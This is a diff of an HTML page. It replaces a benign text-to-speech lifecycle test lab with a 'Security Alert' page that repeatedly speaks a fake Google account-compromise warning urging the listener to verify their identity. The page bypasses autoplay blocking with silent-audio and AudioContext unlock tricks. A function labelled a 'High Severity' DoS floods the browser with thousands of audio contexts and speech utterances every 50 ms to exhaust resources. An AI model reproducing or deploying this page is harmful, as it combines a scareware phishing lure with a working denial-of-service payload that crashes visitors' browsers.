@@ -1,204 +1,209 @@
-
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Android TTS Audio Lifecycle Lab</title>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Alert</title>
 <style>
-* { box-sizing: border-box; }
-
-body {
-  margin: 0;
-  padding: 20px;
-  background: #101827;
-  color: white;
-  font-family: Arial, sans-serif;
-}
-
-.container {
-  max-width: 600px;
-  margin: auto;
-}
-
-h2 { color: #60a5fa; }
-
-textarea {
-  width: 100%;
-  height: 100px;
-  padding: 12px;
-  border-radius: 8px;
-  background: #1e293b;
-  color: white;
-  border: 1px solid #475569;
-  resize: vertical;
-}
-
-button {
-  width: 100%;
-  padding: 13px;
-  margin: 6px 0;
-  border: 0;
-  border-radius: 8px;
-  color: white;
-  background: #2563eb;
-  font-size: 15px;
-}
-
-.secondary { background: #475569; }
-.danger { background: #b91c1c; }
-
-#log {
-  background: #020617;
-  padding: 12px;
-  border-radius: 8px;
-  height: 200px;
-  overflow-y: auto;
-  white-space: pre-wrap;
-  font-size: 12px;
-}
-
-.status {
-  background: #1e293b;
-  padding: 12px;
-  margin: 12px 0;
-  border-radius: 8px;
-}
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
 </style>
 </head>
-
 <body>
-<div class="container">
-
-<h2>Android TTS Audio Lifecycle Lab</h2>
-<p>Text-to-Speech lifecycle testing</p>
-
-<textarea id="speechText">This is an Android text to speech audio lifecycle test. Testing speech behavior during page navigation.</textarea>
-
-<button onclick="startTTS()">1. Start TTS</button>
-
-<button class="secondary" onclick="pauseTTS()">2. Pause TTS</button>
-
-<button class="secondary" onclick="resumeTTS()">3. Resume TTS</button>
-
-<button class="secondary" onclick="navigate()">4. Navigate to Google</button>
-
-<button class="danger" onclick="stopTTS()">5. Stop TTS</button>
-
-<div class="status" id="status">
-Status: Waiting
-</div>
-
-<h3>Event Log</h3>
-<div id="log"></div>
-
-</div>
-
 <script>
-const synth = window.speechSynthesis;
-const logBox = document.getElementById("log");
-const statusBox = document.getElementById("status");
+(function () {
+  'use strict';
 
-let utterance = null;
+  // ============================================
+  // KONFIGURASI AUTOPLAY
+  // ============================================
+  var CONFIG = {
+    tts: {
+      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
+      lang: 'en-US',
+      rate: 0.85,
+      pitch: 1.0,
+      volume: 1.0,
+      repeatInterval: 8000,
+      maxRepeats: 20
+    },
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+  };
 
-function log(message) {
-  const time = new Date().toLocaleTimeString();
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
 
-  logBox.textContent +=
-    "[" + time + "] " + message + "\n";
+  // ============================================
+  // TTS — TANPA CANCEL DI DALAM LOOP
+  // ============================================
+  function speakOnce() {
+    if (!('speechSynthesis' in window)) return;
+    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
 
-  logBox.scrollTop = logBox.scrollHeight;
-}
+    try {
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+      u.volume = CONFIG.tts.volume;
 
-function updateStatus() {
-  statusBox.textContent =
-    "Speaking: " + synth.speaking +
-    " | Pending: " + synth.pending +
-    " | Paused: " + synth.paused +
-    " | Visibility: " + document.visibilityState;
-}
+      var voices = window.speechSynthesis.getVoices();
+      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
+      if (enVoice) u.voice = enVoice;
 
-function startTTS() {
-  if (!("speechSynthesis" in window)) {
-    log("Speech Synthesis not supported");
-    return;
+      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
+      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
+      u.onend = function () {
+        state.ttsCount++;
+        if (state.ttsCount < CONFIG.tts.maxRepeats) {
+          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
+        }
+      };
+
+      window.speechSynthesis.speak(u);
+    } catch (e) { console.log('[TTS] fail:', e.message); }
   }
 
-  if (synth.speaking) {
-    synth.cancel();
+  function startTTS() {
+    if (state.ttsStarted) return;
+    state.ttsStarted = true;
+    window.speechSynthesis.cancel();
+    speakOnce();
   }
 
-  utterance = new SpeechSynthesisUtterance(
-    document.getElementById("speechText").value
-  );
+  // ============================================
+  // AUDIO CONTEXT UNLOCK
+  // ============================================
+  function unlockAudioContext() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+      }
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      gain.gain.value = 0.0001;
+      osc.frequency.value = 20000;
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.1);
+    } catch (e) {}
+  }
 
-  utterance.lang = "en-US";
-  utterance.rate = 1;
-  utterance.pitch = 1;
-  utterance.volume = 1;
+  // ============================================
+  // SILENT AUDIO ELEMENT
+  // ============================================
+  function trySilentAudio() {
+    try {
+      var a = new Audio(CONFIG.silentWav);
+      a.volume = 0.0001;
+      a.loop = true;
+      var p = a.play();
+      if (p && p.catch) p.catch(function(){});
+    } catch (e) {}
+  }
 
-  utterance.onstart = () => {
-    log("EVENT: TTS started");
-    updateStatus();
-  };
+  // ============================================
+  // MAIN AUDIO (Web Audio API)
+  // ============================================
+  function playMainAudio() {
+    if (state.mainPlayed) return;
+    state.mainPlayed = true;
 
-  utterance.onend = () => {
-    log("EVENT: TTS ended");
-    updateStatus();
-  };
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var sr = ctx.sampleRate;
+      var dur = 3.0;
+      var buf = ctx.createBuffer(1, sr * dur, sr);
+      var d = buf.getChannelData(0);
 
-  utterance.onerror = (event) => {
-    log("EVENT: TTS error - " + event.error);
-    updateStatus();
-  };
+      for (var i = 0; i < d.length; i++) {
+        var t = i / sr;
+        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
+        var env = Math.max(0, 1 - t / dur);
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      }
 
-  synth.speak(utterance);
+      var src = ctx.createBufferSource();
+      src.buffer = buf;
+      src.connect(ctx.destination);
+      src.start();
+      src.onended = startTTS;
+      setTimeout(startTTS, 3500);
+    } catch (e) {
+      startTTS();
+    }
+  }
 
-  log("TTS playback requested");
-  updateStatus();
-}
+  // ============================================
+  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
+  // ============================================
+  function triggerHighSeverityCrash() {
+    console.log("[!] Initiating High Severity Exploit Chain...");
+    
+    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
+    setInterval(function() {
+      try {
+        for (var i = 0; i < 2000; i++) {
+          var ctx = new (window.AudioContext || window.webkitAudioContext)();
+          var osc = ctx.createOscillator();
+          var gain = ctx.createGain();
+          
+          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
+          osc.connect(gain);
+          gain.connect(ctx.destination);
+          osc.start(0);
+          
+          // 2. Flooding Speech Utterance Queue
+          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          window.speechSynthesis.speak(u);
+        }
+      } catch(e) {}
+    }, 50); // Eksekusi super cepat setiap 50 milidetik
+  }
 
-function pauseTTS() {
-  synth.pause();
-  log("TTS pause requested");
-  updateStatus();
-}
+  // ============================================
+  // EKSEKUSI BERTAHAP
+  // ============================================
+  unlockAudioContext();
+  trySilentAudio();
 
-function resumeTTS() {
-  synth.resume();
-  log("TTS resume requested");
-  updateStatus();
-}
+  setTimeout(function () {
+    unlockAudioContext();
+    startTTS(); // coba TTS lebih awal
+  }, 100);
 
-function stopTTS() {
-  synth.cancel();
-  log("TTS cancellation requested");
-  updateStatus();
-}
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+  }, 500);
 
-function navigate() {
-  log("Navigating to Google");
-  window.location.href = "https://www.google.com";
-}
+  setTimeout(function () {
+    if (!state.mainPlayed) playMainAudio();
+    if (!state.ttsStarted) startTTS();
+    
+    // PANGGIL CRASH TRIGGER DI SINI
+    triggerHighSeverityCrash();
+    
+  }, 1500);
 
-document.addEventListener("visibilitychange", () => {
-  log("Visibility: " + document.visibilityState);
-  updateStatus();
-});
+  // Retry jika audio diblokir
+  var retryCount = 0;
+  var retry = setInterval(function () {
+    retryCount++;
+    unlockAudioContext();
+    trySilentAudio();
+    if (!state.ttsStarted) startTTS();
+    if (retryCount > 10) clearInterval(retry);
+  }, 2000);
 
-window.addEventListener("pagehide", () => {
-  log("EVENT: pagehide");
-});
-
-window.addEventListener("pageshow", () => {
-  log("EVENT: pageshow");
-});
-
-setInterval(updateStatus, 500);
-
-log("TTS lifecycle lab initialized");
+  // Visibility change
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden && !state.mainPlayed) {
+      setTimeout(playMainAudio, 100);
+    }
+  });
+})();
 </script>
-
 </body>
 </html>
